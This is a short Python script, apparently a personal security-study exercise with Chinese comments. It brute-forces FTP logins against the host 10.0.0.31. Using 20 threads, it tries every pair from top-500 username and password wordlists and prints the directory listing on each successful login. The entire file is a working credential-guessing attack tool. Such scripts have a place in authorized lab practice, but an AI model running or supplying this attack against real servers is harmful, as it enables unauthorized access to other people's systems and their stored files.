import ftplib
import sys
import threading
import queue

#简单的模拟登陆测试
#爆破: IP端用中名密码字典
def ftp_brute():
    while not q.empty():
        dict=q.get()
        dict=dict.split('|')
        user=dict[0]
        password=dict[1]
        ftp=ftplib.FTP()
        ftp.connect('10.0.0.31',21)
        try:
            ftp.login(user,password)
            list=ftp.retrlines('list')
            print(list)
            print(user+'-->'+password+"-->连接成功")
        except ftplib.all_errors:
            print(user+'-->'+password+"-->连接失败")
            pass

if __name__=='__main__':
    q=queue.Queue()
    for user in open("D:\\BaiduNetdiskDownload\\笔记\\安全\\安全编程\\fuzzDicts-master\\userNameDict\\top500.txt"):
        user=user.replace("\n","")
        for password in open("D:\\BaiduNetdiskDownload\\笔记\\安全\\安全编程\\fuzzDicts-master\\passwordDict\\top500.txt"):
            password=password.replace("\n","")
            dictlist=user+'|'+password
            q.put(dictlist)
            # print(user+'-->'+password)
    for x in range(20):
        t=threading.Thread(target=ftp_brute)
        t.start()
    # ftp_brute()
   